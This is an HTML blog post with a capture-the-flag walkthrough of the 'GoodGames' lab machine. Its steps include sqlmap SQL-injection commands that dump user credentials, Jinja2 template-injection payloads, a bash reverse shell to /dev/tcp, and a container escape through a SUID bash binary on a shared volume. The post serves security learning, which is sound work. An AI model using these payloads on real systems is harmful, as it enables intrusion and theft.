<!doctype html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="generator" content="Docusaurus v2.0.0-beta.6">
<link rel="alternate" type="application/rss+xml" href="/Blog/blog/rss.xml" title="Penetration Testing Journal Blog RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/Blog/blog/atom.xml" title="Penetration Testing Journal Blog Atom Feed"><title data-react-helmet="true">GoodGames | Penetration Testing Journal</title><meta data-react-helmet="true" name="twitter:card" content="summary_large_image"><meta data-react-helmet="true" property="og:url" content="https://danae-pan.github.io/Blog/blog/GoodGames"><meta data-react-helmet="true" name="docusaurus_locale" content="en"><meta data-react-helmet="true" name="docusaurus_tag" content="default"><meta data-react-helmet="true" property="og:title" content="GoodGames | Penetration Testing Journal"><meta data-react-helmet="true" name="description" content="Task 1"><meta data-react-helmet="true" property="og:description" content="Task 1"><meta data-react-helmet="true" property="og:type" content="article"><meta data-react-helmet="true" property="article:published_time" content="2025-04-04T21:17:12.938Z"><link data-react-helmet="true" rel="canonical" href="https://danae-pan.github.io/Blog/blog/GoodGames"><link data-react-helmet="true" rel="alternate" href="https://danae-pan.github.io/Blog/blog/GoodGames" hreflang="en"><link data-react-helmet="true" rel="alternate" href="https://danae-pan.github.io/Blog/blog/GoodGames" hreflang="x-default"><link rel="stylesheet" href="/Blog/assets/css/styles.48b03b08.css">
<link rel="preload" href="/Blog/assets/js/runtime~main.d6e32f54.js" as="script">
<link rel="preload" href="/Blog/assets/js/main.a9b7a928.js" as="script">
</head>
<body>
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"dark")}()</script><div id="__docusaurus">
<div><a href="#" class="skipToContent_OuoZ">Skip to main content</a></div><nav class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Navigation bar toggle" class="navbar__toggle clean-btn" type="button" tabindex="0"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/Blog/"><b class="navbar__title">About Me</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/Blog/blog">Blog</a></div><div class="navbar__items navbar__items--right"></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div class="main-wrapper blog-wrapper blog-post-page"><div class="container margin-vert--lg"><div class="row"><aside class="col col--3"><nav class="sidebar_q+wC thin-scrollbar" aria-label="Blog recent posts navigation"><div class="sidebarItemTitle_9G5K margin-bottom--md">Recent posts</div><ul class="sidebarItemList_6T4b"><li class="sidebarItem_cjdF"><a class="sidebarItemLink_zyXk" href="/Blog/blog/Devvortex">Devvortex</a></li><li class="sidebarItem_cjdF"><a class="sidebarItemLink_zyXk" href="/Blog/blog/Sau">Sau</a></li><li class="sidebarItem_cjdF"><a class="sidebarItemLink_zyXk" href="/Blog/blog/Jerry">Jerry</a></li><li class="sidebarItem_cjdF"><a aria-current="page" class="sidebarItemLink_zyXk sidebarItemLinkActive_wcJs" href="/Blog/blog/GoodGames">GoodGames</a></li><li class="sidebarItem_cjdF"><a class="sidebarItemLink_zyXk" href="/Blog/blog/Cap">Cap</a></li></ul></nav></aside><main class="col col--7" itemscope="" itemtype="http://schema.org/Blog"><article itemprop="blogPost" itemscope="" itemtype="http://schema.org/BlogPosting"><header><h1 class="blogPostTitle_d4p0" itemprop="headline">GoodGames</h1><div class="blogPostData_-Im+ margin-vert--md"><time datetime="2025-04-04T21:17:12.938Z" itemprop="datePublished">April 4, 2025</time> · 5 min read</div></header><div class="markdown" itemprop="articleBody"><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="task-1"></a>Task 1<a class="hash-link" href="#task-1" title="Direct link to heading">#</a></h3><p>Submit User Flag</p><p>We use nmap to find the services on the target machine and we see that an apache server runs on port 80.</p><p><code>nmap -sV target_ip</code></p><p><img alt="alt text" src="/Blog/assets/images/image-g-619aec147bcca7992c4a856afd59376d.png"></p><p>Navigating to the browser we see a login page where we will try bypassing the authentication using SQL injection.</p><p>Server-Side Template Injection (SSTI) vulnerability arises when an application incorporates user-supplied input directly into its server-side templates without proper sanitization or validation. Template engines, which combine templates with dynamic data to generate web pages, can be exploited through SSTI attacks.</p><p>To find forms that are candidates for sql injection run</p><p><code>sqlmap -u &quot;http://10.129.51.14/&quot; --forms --crawl=2 --dbms=mysql</code></p><p>--crawl=CRAWLDEPTH: crawls the website starting from the target url</p><p>We find a total of 8 targets. One of the identified forms is the login form and sqlmap auto-filled blank fields, tried multiple techniques and identified that the email field is vulnerable to time-based blind SQL injection.</p><p><img alt="alt text" src="/Blog/assets/images/image-g-3-8ddec9f638f40155c2cfce60b335ca99.png"></p><p><img alt="alt text" src="/Blog/assets/images/image-g-5-14f9524c6351ec8b2949c6aabdb1699a.png"></p><p>After confirming the vulnerability we want to enumerate the database and find the table storing the usernames and passwords to get the user flag.</p><p>We can try running the following command to retrieve the databse names.</p><p><code>sqlmap -u &quot;http://10.129.51.14/login&quot; --data=&quot;email=*&amp;password=test123&quot; --dbs</code></p><p>We found 2 available databases named information_schema and main.</p><p>Next, we will list the tables from each.</p><p><code>sqlmap -u &quot;http://10.129.51.14/login&quot; --data=&quot;email=*&amp;password=test123/login&quot; -D &lt;database_name&gt; --tables</code></p><p>Starting with the database named main, we find 3 tables blog, blog_comments and user and which we can further investigate.
We start with the table user.</p><p><code>sqlmap -u &quot;http://10.129.51.14/login&quot; --data=&quot;email=*&amp;password=test123/login&quot; -D main -T user --columns</code></p><p>There, we find 4 columns in total with a column named email and a column name password that might get us the flags we need.</p><p><img alt="alt text" src="/Blog/assets/images/image-g-9-708f4e42c7a8b057b1491a527b02dd4c.png"></p><p>We then run the following command to retreive that information.</p><p><code>sqlmap -u &quot;http://10.129.51.14/login&quot; --data=&quot;email=*&amp;password=test123/login&quot; -D main -T user -C email,password --dump</code></p><p>We find the email and the password and with those credentials we login after we use a hash cracker to find the plain texts password from the hashed one.</p><p>Now that we are logged in as admin, we can see a gear on the top right that redirects as to internal-administration.goodgames.htb. We need to edit the /etc/hosts file to point this domain to the target machine&#x27;s IP.
Note, editing the hosts file requires administrative privileges.</p><p>Following the url, we see a login page:
<img alt="alt text" src="/Blog/assets/images/image-g-10-3bbc2422ba2194b241164d73cc3cc2df.png"></p><p>There we reuse the credentials that we found on the previous step, where admin is the username.
We are presented with a dashborad for the admin.</p><p><img alt="alt text" src="/Blog/assets/images/image-g-11-847dbb40ceb4806ac34aceaa816cb947.png"></p><p>After we are in we attempt to find a palce where sql injection is possible. Navigating to the settings page,
we see the general information where we can try sql injection on the field of the full name.
We try the usual test of &#x27; OR 1=1 --- and we see this renders as the full name. We then try {{1+1}} for Jinja2 (Python) and we see this results to two,
so we confirm SSTI (Server Side Template Injection) which can lead to an RCE.
Now we can go on with jinja2 exploitation. </p><p>First we open a port locally:</p><p><code>nc -lvnp 4343</code></p><p>Different ways using some python libraries to exploit including:</p><div class="codeBlockContainer_J+bg"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#bfc7d5"><span class="token plain">{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen(&#x27;id&#x27;).read() }}</span></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen(&#x27;id&#x27;).read() }}</span></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen(&#x27;id&#x27;).read() }}</span></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>Or in the shotest versions:</p><div class="codeBlockContainer_J+bg"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#bfc7d5"><span class="token plain">{{ cycler.__init__.__globals__.os.popen(&#x27;id&#x27;).read() }}</span></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">{{ joiner.__init__.__globals__.os.popen(&#x27;id&#x27;).read() }}</span></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">{{ namespace.__init__.__globals__.os.popen(&#x27;id&#x27;).read() }}</span></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>We used
<code>{{ cycler.__init__.__globals__.os.popen(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/&lt;local_ip&gt;/&lt;exposed_port&gt; 0&gt;&amp;1&quot;&#x27;).read() }}</code></p><p>We now got the root control of the server</p><p><img alt="alt text" src="/Blog/assets/images/image-g-13-8fe182bc64b3755a649dfde16e3292a3.png"></p><p>We can then navigate to /home/augustus where we find the user.text, in which the user flag is user flag is located.</p><h3><a aria-hidden="true" tabindex="-1" class="anchor anchor__h3 anchorWithStickyNavbar_y2LR" id="task-2"></a>Task 2<a class="hash-link" href="#task-2" title="Direct link to heading">#</a></h3><p>But since we are already a root user but not finding any root.txt under the /root directory, we might be inside a container.</p><p>We can invistigate the cgroup file under the proc folder that contains all processes.</p><p><img alt="alt text" src="/Blog/assets/images/image-g-15-4d8c36c0f79ff0d58fa5290d320af8ae.png"></p><p>From this file, we understand that we are inside a docker container. So, we need to access the host from the container which is known as container escape or breakout.</p><p>One way of container gaining access to host file systems, is if they areconfigured to run with the SYS_ADMIN capability which allows
containers to perform actions through the linux kernel that would be available only to root users on a linux server.</p><p>capa=<code>cat /proc/1/status | grep -i &#x27;CapEff&#x27; | awk &#x27;{print $2}&#x27;</code>; capsh --decode=$capa</p><p>grep CapEff /proc/$$/status</p><p>CapEff this set represents all the capabilities the process is using at a specific moment in time.
Then we need to decode the permitted capcbility using capsh.</p><p><code>capsh -- decode=xxxxxx00000000a80425fb</code></p><p><img alt="alt text" src="/Blog/assets/images/image-g-16-b7a6ca6d404905a3de370767b7d77959.png"></p><p>After decoding, we see that the cap_sys_admin capability is not there, so we cannot use this to escape the container.</p><p>We then can try ssh to the host machine using the username augustus and the password we had before found for the admin
<code>ssh augustus@172.19.0.1</code></p><p>And it works! </p><p>Since the container mounts /home/augustus from the host anything the container writes in this directory, is also visible on the host and vice versa.</p><p>Having said that we can follow the next steps to create a SUID-root bash binary on the host via a shared volume.
While in the host we copy the /bin/bash to the current dirrectory <code>cp /bin/bash .</code>.
Then inside the container we can:</p><div class="codeBlockContainer_J+bg"><div class="codeBlockContent_csEI"><pre tabindex="0" class="prism-code language-undefined codeBlock_rtdJ thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_1zSZ"><span class="token-line" style="color:#bfc7d5"><span class="token plain">chown root:root /home/augustus/bash</span></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">chmod 4777 /home/augustus/bash</span></span></code></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_M3SB clean-btn">Copy</button></div></div><p>Now going back to host, we run <code>./bash -p</code> to get a root shell and finally get the root flag.</p><p><img alt="alt text" src="/Blog/assets/images/image-g-18-0ec48d0f47799d25b3a8ea8d10dc55c4.png"></p><p>What is blind SQL injection?</p><p>Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.
Many techniques as UNION attacks are not effective with blind SQL injection vulnerabilities. This is because they rely on being able to see the results of the inkected query within the application&#x27;s responses.</p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Blog post page navigation"><div class="pagination-nav__item"><a class="pagination-nav__link" href="/Blog/blog/Jerry"><div class="pagination-nav__sublabel">Newer Post</div><div class="pagination-nav__label">« Jerry</div></a></div><div class="pagination-nav__item pagination-nav__item--next"><a class="pagination-nav__link" href="/Blog/blog/Cap"><div class="pagination-nav__sublabel">Older Post</div><div class="pagination-nav__label">Cap »</div></a></div></nav></main><div class="col col--2"><div class="tableOfContents_vrFS thin-scrollbar"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#task-1" class="table-of-contents__link">Task 1</a></li><li><a href="#task-2" class="table-of-contents__link">Task 2</a></li></ul></div></div></div></div></div><footer class="footer footer--dark"><div class="container"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Contact</div><ul class="footer__items"><li class="footer__item"><a href="https://github.com/danae-pan" target="_blank" rel="noopener noreferrer" class="footer__link-item"><span>GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_wgqa"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li><li class="footer__item"><a href="https://linkedin.com/in/anastasia-danai-panagiotopoulou" target="_blank" rel="noopener noreferrer" class="footer__link-item"><span>LinkedIn<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_wgqa"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></span></a></li></ul></div></div><div class="footer__bottom text--center"></div></div></footer></div>
<script src="/Blog/assets/js/runtime~main.d6e32f54.js"></script>
<script src="/Blog/assets/js/main.a9b7a928.js"></script>
</body>
</html>